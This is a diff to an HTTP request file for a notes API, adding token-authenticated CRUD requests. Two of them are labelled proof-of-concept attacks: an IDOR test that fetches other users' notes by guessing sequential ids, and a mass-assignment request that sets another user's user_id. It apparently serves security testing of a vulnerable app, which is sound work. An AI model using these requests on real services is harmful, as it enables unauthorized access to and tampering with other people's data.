@@ -18,3 +18,50 @@ Content-Type: application/json
   "email": "test@test1.com",
   "password": "123456"
 }
+
+### ------------------------------
+### Notes (replace TOKEN with a login response's token)
+@token = TOKEN
+
+### List notes
+GET {{baseUrl}}/notes
+Authorization: Bearer {{token}}
+
+### Get note by id (replace NOTE_ID with a sequential integer — this is the IDOR PoC, try ids that aren't yours)
+GET {{baseUrl}}/notes/NOTE_ID
+Authorization: Bearer {{token}}
+
+### Create note
+POST {{baseUrl}}/notes
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{
+  "title": "My first note",
+  "body": "hello world"
+}
+
+### Create note — mass assignment PoC (attach to a guessed user_id, ids are sequential)
+POST {{baseUrl}}/notes
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{
+  "title": "Not mine",
+  "body": "attacker note",
+  "user_id": 2
+}
+
+### Update note (replace NOTE_ID)
+PUT {{baseUrl}}/notes/NOTE_ID
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{
+  "title": "Updated title",
+  "body": "updated body"
+}
+
+### Delete note (replace NOTE_ID)
+DELETE {{baseUrl}}/notes/NOTE_ID
+Authorization: Bearer {{token}}
